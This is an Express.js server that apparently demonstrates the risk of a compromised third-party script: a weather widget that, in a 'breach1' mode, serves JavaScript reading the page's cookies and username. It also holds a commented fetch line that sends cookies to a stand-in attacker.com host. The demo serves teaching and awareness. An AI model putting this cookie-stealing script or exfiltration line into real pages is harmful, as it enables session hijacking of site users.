const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 5000;

// Parse CLI args for mode
const args = process.argv.slice(2);
const modeArg = args.find(a => a.startsWith('--mode'));
const mode = modeArg ? modeArg.split('=')[1] || args[args.indexOf(modeArg) + 1] : 'normal';

console.log(`[System] WeatherApp starting in mode: ${mode}`);

// CORS — open to all (simulates a poorly configured third-party)
app.use(cors());

// Serve appropriate weather.js based on mode
app.get('/weather.js', (req, res) => {
  res.type('application/javascript');

  if (mode === 'breach1') {
    // ── MALICIOUS MODE ──
    console.log('[WeatherApp] ⚠️  BREACH1 MODE ACTIVE — serving malicious script');
    res.send(`
// ── WeatherApp Widget (Port 5000) — BREACH1 MODE ──
(function () {
  console.warn('[WeatherApp] ⚠️ BREACH1 MODE — executing malicious payload');

  // Attacker reads cookies and DOM content
  var cookies = document.cookie;
  var username = '';
  var el = document.getElementById('username');
  if (el) username = el.innerText;

  alert("HACKED: I can see your cookies: " + cookies + " and User: " + username);

  // Could also exfiltrate to attacker server silently:
  // fetch('http://attacker.com/steal?c=' + encodeURIComponent(cookies));
  console.error('[WeatherApp] Data exfiltrated — cookies: ' + cookies + ' | user: ' + username);
})();
    `);
  } else {
    // ── NORMAL MODE ──
    const temp = (18 + Math.random() * 10).toFixed(1);
    res.send(`
// ── WeatherApp Widget (Port 5000) — Normal Mode ──
(function () {
  console.log('[WeatherApp] Current temperature: ${temp}°C (fetched from WeatherApp Port 5000)');

  // Inject a subtle weather badge into the page
  var badge = document.createElement('div');
  badge.style.cssText = \`
    position: fixed;
    top: 60px;
    right: 16px;
    background: rgba(23,26,35,0.9);
    border: 1px solid #2a2f45;
    border-radius: 8px;
    padding: 8px 14px;
    font-size: 0.75rem;
    color: #6b7394;
    font-family: 'Courier New', monospace;
    z-index: 100;
    backdrop-filter: blur(4px);
  \`;
  badge.textContent = '🌡 ${temp}°C';
  document.body.appendChild(badge);

  if (window.setStatus) {
    window.setStatus('weather-status', 'green', 'WeatherApp :5000');
  }
})();
    `);
  }
});

app.listen(PORT, () => {
  console.log(`[System] WeatherApp running at http://localhost:${PORT}`);
  if (mode === 'breach1') {
    console.log('[System] ⚠️  WARNING: Serving malicious breach1 payload!');
  }
});
